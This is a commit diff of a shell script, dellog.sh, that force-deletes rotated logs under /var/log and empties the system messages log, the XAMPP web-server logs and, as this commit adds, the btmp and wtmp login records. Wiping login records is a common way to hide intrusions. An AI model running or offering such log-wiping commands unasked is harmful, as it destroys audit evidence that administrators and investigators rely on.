c328e9e47cff94402647257be8e81d8df6b8b982
liuyun <yourshell@users.noreply.github.com>
2019-08-16 18:25:36 +0800

    Add files via upload

--- dellog.sh
+++ dellog.sh
@@ -1,9 +1,14 @@
+#!/usr/bin/env bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
+export PATH
 
 find /var/log -name '*.gz'    -exec rm -rf {} \;
 find /var/log -name '*.1'     -exec rm -rf {} \;
 find /var/log -name '*-2*'    -exec rm -rf {} \;
 find /var/log -type f         -exec ls {} \;
 touch > /var/log/messages
+touch > /var/log/btmp
+touch > /var/log/wtmp
 touch > /opt/lampp/logs/access_log
 touch > /opt/lampp/logs/error_log
 touch > /opt/lampp/logs/php_error_log
